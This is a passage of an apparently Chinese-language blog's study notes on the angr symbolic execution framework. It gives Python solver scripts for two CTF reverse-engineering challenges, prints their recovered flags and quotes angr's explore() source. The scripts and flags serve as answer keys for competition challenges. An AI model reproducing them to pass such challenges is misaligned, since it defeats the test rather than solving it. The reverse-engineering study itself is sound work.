        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">)</span>
        <span class="token comment"># self.inline_call()</span>


<span class="token keyword">class</span> <span class="token class-name">MyGetStringUTFChars</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>size<span class="token punctuation">,</span>return_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>size <span class="token operator">=</span> size
        self<span class="token punctuation">.</span>return_addr <span class="token operator">=</span> return_addr
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        <span class="token comment"># print("[HOOKED-INFO]EIP:",st.regs.eip,"CALLING GetStringUTFChars(",arg0,arg1,arg2,")")</span>
        flag_addr   <span class="token operator">=</span> <span class="token number">0x5000000</span>
        flag_length <span class="token operator">=</span> self<span class="token punctuation">.</span>size
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> flag_addr
        flag_char <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%i"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag_length<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment"># assume len(flag) &lt;= 64</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_char<span class="token punctuation">:</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>
            st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_char<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>return_addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">hook_length</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>flag_size<span class="token punctuation">,</span>return_addr<span class="token punctuation">,</span>unhook_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        SimProcedure<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>flag_size <span class="token operator">=</span> flag_size
        self<span class="token punctuation">.</span>return_addr <span class="token operator">=</span> return_addr
        self<span class="token punctuation">.</span>unhook_addr <span class="token operator">=</span> unhook_addr
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        st <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> self<span class="token punctuation">.</span>flag_size
        self<span class="token punctuation">.</span>project<span class="token punctuation">.</span>unhook<span class="token punctuation">(</span>self<span class="token punctuation">.</span>unhook_addr<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>jump<span class="token punctuation">(</span>self<span class="token punctuation">.</span>return_addr<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Basic_Stirng</span><span class="token punctuation">(</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr     <span class="token operator">=</span> <span class="token number">0x83A0</span>   
        st       <span class="token operator">=</span> self<span class="token punctuation">.</span>state
        sp       <span class="token operator">=</span> st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1     <span class="token operator">=</span> st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        call<span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">,</span><span class="token string">"Basic_String"</span><span class="token punctuation">,</span>arg0<span class="token punctuation">,</span>arg1<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>flag_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'angr.manager'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span>
    p <span class="token operator">=</span> Project<span class="token punctuation">(</span><span class="token string">'./libnative-lib.so'</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'base_addr'</span><span class="token punctuation">:</span>base<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x8DCE</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x82B6</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x82C2</span><span class="token punctuation">,</span>Basic_Stirng<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x8EB8</span><span class="token punctuation">,</span>MyGetStringUTFChars<span class="token punctuation">(</span>flag_size<span class="token punctuation">,</span>return_addr<span class="token operator">=</span><span class="token number">0x8EBA</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x8EBF</span><span class="token punctuation">,</span>hook_length<span class="token punctuation">(</span>flag_size<span class="token punctuation">,</span><span class="token number">0x8EC4</span><span class="token punctuation">,</span><span class="token number">0x8EBF</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
    
    checkName_off <span class="token operator">=</span> <span class="token number">0x8DA0</span>
    
    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr <span class="token operator">=</span> base <span class="token operator">+</span> checkName_off<span class="token punctuation">)</span>
    <span class="token comment"># 初始化栈</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">=</span> <span class="token number">0x8000000</span>  <span class="token comment"># 0xC TO BE Aligned</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> <span class="token number">0x7000000</span>
    st<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> <span class="token number">0x0</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>

    memcpy_off <span class="token operator">=</span> <span class="token number">0x8F0F</span>
    
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> <span class="token punctuation">[</span>memcpy_off<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span>stashes<span class="token punctuation">)</span>
    <span class="token keyword">if</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
        fd <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        sp <span class="token operator">=</span> fd<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp
        arg0 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg1 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        arg2 <span class="token operator">=</span> fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>sp<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span>
        <span class="token comment"># IPython.embed()</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s1 = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg0<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\ns2 = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg1<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\nn = "</span><span class="token punctuation">,</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg2<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>LE<span class="token punctuation">)</span><span class="token punctuation">)</span>
        flag_number <span class="token operator">=</span> fd<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>arg0<span class="token punctuation">,</span>flag_size<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">)</span>
        flag <span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>flag_number<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FLAG : "</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span>
        IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> flag

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> main<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'12jammyT\x00'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span>flag_size<span class="token operator">=</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>最后把这个账号密码输入进 app 中就可以得到 flag<br>12jammyT<br>stove:spill2:drivable:1<br>rarctf{pl34s3_d0nt_s0lv3_st4tic4lly_3829103890}</p>
<p><strong>怎么动调还是不知道。。。这咋办</strong></p>
<h3 id="inctf2021-chall-DONE"><a href="#inctf2021-chall-DONE" class="headerlink" title="inctf2021 chall |DONE"></a>inctf2021 chall |DONE</h3><p>简单的一个执行，没有什么需要特别注意的。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr
<span class="token keyword">import</span> claripy
<span class="token keyword">import</span> IPython
<span class="token keyword">import</span> archinfo

base <span class="token operator">=</span> <span class="token number">0x0</span>

<span class="token keyword">def</span> <span class="token function">hook_input</span><span class="token punctuation">(</span>st<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag_addr <span class="token operator">=</span> <span class="token number">0x202100</span><span class="token operator">+</span>base
    flag_length <span class="token operator">=</span> <span class="token number">30</span>
    flag_char <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">"flag_%i"</span> <span class="token operator">%</span>i<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>flag_length<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_char<span class="token punctuation">:</span>
        st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0x20</span><span class="token punctuation">)</span>
        st<span class="token punctuation">.</span>add_constraints<span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span>

    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_char<span class="token operator">+</span><span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    st<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./chall"</span><span class="token punctuation">,</span>load_options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'main_opts'</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">'auto_load_libs'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'base_addr'</span><span class="token punctuation">:</span>base<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0xB84</span><span class="token operator">+</span>base<span class="token punctuation">,</span>hook_input<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>

    st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>full_init_state<span class="token punctuation">(</span><span class="token punctuation">)</span>

    sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>st<span class="token punctuation">)</span>

    find_answer   <span class="token operator">=</span> <span class="token number">0xADB</span>
    find <span class="token operator">=</span> <span class="token punctuation">[</span>find_answer<span class="token punctuation">]</span>
    
    avoid <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xB9B</span><span class="token operator">+</span>base<span class="token punctuation">]</span>
    sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find <span class="token operator">=</span> find<span class="token punctuation">,</span>avoid <span class="token operator">=</span> avoid<span class="token punctuation">)</span>

    fd      <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
        fd <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flag_list <span class="token operator">=</span> fd<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval_upto<span class="token punctuation">(</span>fd<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x202100</span><span class="token operator">+</span>base<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span>endness<span class="token operator">=</span>archinfo<span class="token punctuation">.</span>Endness<span class="token punctuation">.</span>BE<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_list<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag_list<span class="token punctuation">)</span><span class="token punctuation">)</span>
    IPython<span class="token punctuation">.</span>embed<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Advanced-Topics"><a href="#Advanced-Topics" class="headerlink" title="Advanced Topics"></a>Advanced Topics</h2><p>from source &amp;&amp; angr-doc</p>
<h3 id="emulated-filesystem"><a href="#emulated-filesystem" class="headerlink" title="emulated filesystem"></a>emulated filesystem</h3><p>example 里面的 asis 用到过，还行</p>
<h3 id="The-Whole-Pipeline"><a href="#The-Whole-Pipeline" class="headerlink" title="The Whole Pipeline"></a>The Whole Pipeline</h3><p>这个我觉得挺重要的，没看懂源码的情况下，angr 执行的就像个黑盒，不可预测。</p>
<h4 id="sm-explore-1"><a href="#sm-explore-1" class="headerlink" title="sm.explore()"></a>sm.explore()</h4><p>sm.run() 的一个包装</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">explore</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stash<span class="token operator">=</span><span class="token string">'active'</span><span class="token punctuation">,</span> n<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> find<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> avoid<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> find_stash<span class="token operator">=</span><span class="token string">'found'</span><span class="token punctuation">,</span> avoid_stash<span class="token operator">=</span><span class="token string">'avoid'</span><span class="token punctuation">,</span> cfg<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>
            num_find<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Tick stash "stash" forward (up to "n" times or until "num_find" states are found), looking for condition "find",
    avoiding condition "avoid". Stores found states into "find_stash' and avoided states into "avoid_stash".

    The "find" and "avoid" parameters may be any of:

    - An address to find
    - A set or list of addresses to find
    - A function that takes a state and returns whether or not it matches.

    If an angr CFG is passed in as the "cfg" parameter and "find" is either a number or a list or a set, then
    any states which cannot possibly reach a success state without going through a failure state will be
    preemptively avoided.
    """</span>
    num_find <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_stashes<span class="token punctuation">[</span>find_stash<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> find_stash <span class="token keyword">in</span> self<span class="token punctuation">.</span>_stashes <span class="token keyword">else</span> <span class="token number">0</span>
    tech <span class="token operator">=</span> self<span class="token punctuation">.</span>use_technique<span class="token punctuation">(</span>Explorer<span class="token punctuation">(</span>find<span class="token punctuation">,</span> avoid<span class="token punctuation">,</span> find_stash<span class="token punctuation">,</span> avoid_stash<span class="token punctuation">,</span> cfg<span class="token punctuation">,</span> num_find<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Modify first Veritesting so that they can work together.</span>
    deviation_filter_saved <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">for</span> t <span class="token keyword">in</span> self<span class="token punctuation">.</span>_techniques<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span>Veritesting<span class="token punctuation">)</span><span class="token punctuation">:</span>
            deviation_filter_saved <span class="token operator">=</span> t<span class="token punctuation">.</span>options<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"deviation_filter"</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> deviation_filter_saved <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                t<span class="token punctuation">.</span>options<span class="token punctuation">[</span><span class="token string">"deviation_filter"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> tech<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">or</span> tech<span class="token punctuation">.</span>avoid<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">or</span> deviation_filter_saved<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                t<span class="token punctuation">.</span>options<span class="token punctuation">[</span><span class="token string">"deviation_filter"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> tech<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">or</span> tech<span class="token punctuation">.</span>avoid<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>run<span class="token punctuation">(</span>stash<span class="token operator">=</span>stash<span class="token punctuation">,</span> n<span class="token operator">=</span>n<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>remove_technique<span class="token punctuation">(</span>tech<span class="token punctuation">)</span>

    <span class="token keyword">for</span> t <span class="token keyword">in</span> self<span class="token punctuation">.</span>_techniques<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span>Veritesting<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> deviation_filter_saved <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">del</span> t<span class="token punctuation">.</span>options<span class="token punctuation">[</span><span class="token string">"deviation_filter"</span><span class="token punctuation">]</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                t<span class="token punctuation">.</span>options<span class="token punctuation">[</span><span class="token string">"deviation_filter"</span><span class="token punctuation">]</span> <span class="token operator">=</span> deviation_filter_saved
            <span class="token keyword">break</span>

